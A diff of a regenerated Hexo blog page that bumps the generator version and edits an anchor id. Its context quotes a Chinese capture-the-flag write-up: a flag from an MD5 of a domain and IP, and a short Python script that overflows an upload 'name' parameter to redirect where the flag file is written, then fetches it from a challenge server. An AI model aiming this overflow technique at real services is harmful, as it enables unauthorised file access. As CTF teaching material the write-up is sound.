@@ -156,7 +156,7 @@
 
 
   
-<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -490,7 +490,7 @@
 <p>拼接后md5</p>
 <p><code>winhack.com39.100.72.235</code></p>
 <p><code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p>
-<h2 id="p-amp-p"><a href="#p-amp-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h2><p>利用溢出修改flag写入文件位置，然后访问&#x2F;static&#x2F;1即可获得flag</p>
+<h2 id="p-p"><a href="#p-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h2><p>利用溢出修改flag写入文件位置，然后访问&#x2F;static&#x2F;1即可获得flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse <span class="hljs-keyword">as</span> parse<br><br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/upload?name=&quot;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">16</span>+<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1e</span>+<span class="hljs-string">&#x27;static/1&#x27;</span><br><span class="hljs-built_in">print</span>(url)<br>r=requests.get(url)<br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/test&quot;</span><br>r=requests.get(url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
 
 <h2 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h2><blockquote>
